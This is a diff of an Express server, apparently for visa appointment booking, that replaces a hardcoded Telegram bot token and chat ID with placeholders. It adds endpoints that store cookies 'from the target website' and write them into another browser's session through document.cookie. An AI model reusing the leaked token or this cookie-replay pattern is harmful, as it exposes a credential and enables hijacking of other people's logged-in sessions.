@@ -18,8 +18,8 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 // Telegram Configuration (optional, can be removed if not needed)
-const botToken = process.env.BOT_TOKEN || '7462569364:AAFopBu0YGk8EMPhxDDGrkiNhkqEC8F0XDM'; // Replace with your bot token
-const chatId = process.env.CHAT_ID || '-1002406480101'; // Replace with your chat ID
+const botToken = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // Replace with your bot token
+const chatId = process.env.CHAT_ID || 'YOUR_CHAT_ID'; // Replace with your chat ID
 
 // Function to send a message to Telegram (optional, can be removed if not needed)
 async function sendTelegramMessage(message) {
@@ -57,8 +57,8 @@ const sessions = {};
 app.post('/generate-token', (req, res) => {
     const sessionData = {
         url: req.body.url, // URL of the current page
+        cookies: req.body.cookies || '', // Cookies from the target website
         formData: req.body.formData || {}, // Form data (if any)
-        cookies: req.body.cookies || '', // Cookies (if any)
         timestamp: new Date().toISOString(), // Timestamp for tracking
     };
 
@@ -85,7 +85,10 @@ app.get('/share', (req, res) => {
                 <title>Continue Session</title>
                 <script>
                     // Restore cookies
-                    document.cookie = ${JSON.stringify(sessionData.cookies)};
+                    const cookies = ${JSON.stringify(sessionData.cookies)};
+                    cookies.split(';').forEach(cookie => {
+                        document.cookie = cookie.trim();
+                    });
 
                     // Restore form data
                     const formData = ${JSON.stringify(sessionData.formData)};
@@ -111,41 +114,15 @@ app.get('/share', (req, res) => {
 });
 
 // Endpoint to handle incoming data (for Telegram notifications, optional)
-app.post('/telemetry', async (req, res) => {
+app.post('/submit-data', (req, res) => {
     try {
-        const {
-            token,
-            country,
-            location,
-            visaSubType,
-            appointmentFor,
-            category,
-            timeOfSending,
-            appointmentDate,
-            slots
-        } = req.body;
+        const gatheredData = req.body; // Data gathered by the client
+        console.log('Data received from client:', gatheredData);
 
-        // Log the received data
-        console.log('Received data:', req.body);
+        // Process the gathered data (e.g., save to database, send notifications)
+        // ...
 
-        // Prepare the message for Telegram
-        const message = `
-📅 *New Appointment Slot Available!*
-- *Appointment Date:* ${appointmentDate}
-- *Available Slots:* ${slots}
-- *Location:* ${location}
-- *Category:* ${category}
-- *Visa Subtype:* ${visaSubType}
-- *Time of Sending:* ${timeOfSending}
-        `;
-
-        console.log('Sending message to Telegram:', message); // Log the message
-
-        // Send the message to Telegram
-        await sendTelegramMessage(message);
-
-        // Respond to the client
-        res.status(200).send('Data received and Telegram notification sent successfully');
+        res.status(200).send('Data received successfully');
     } catch (error) {
         console.error('Error processing request:', error);
         res.status(500).send('Internal Server Error');
